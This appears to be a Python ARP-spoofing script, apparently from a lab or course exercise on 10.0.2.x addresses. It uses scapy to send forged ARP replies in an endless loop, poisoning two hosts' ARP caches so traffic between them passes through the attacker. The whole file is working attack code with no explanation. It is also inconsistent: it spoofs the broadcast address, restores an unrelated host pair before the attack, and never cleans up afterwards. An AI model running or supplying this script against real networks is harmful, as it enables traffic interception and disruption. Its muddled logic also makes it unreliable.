#!/usr/bin/env python
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


restore("10.0.2.7", "10.0.2.1")
try:
    send_packet_counts = 0
    while True:
        spoof("10.0.2.5", "10.0.2.255")
        spoof("10.0.2.255", "10.0.2.5")
        send_packet_counts = send_packet_counts + 2
        print("\r[+] Packet send: " + str(send_packet_counts), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("Quitting because Keyboard Interrupts.....")
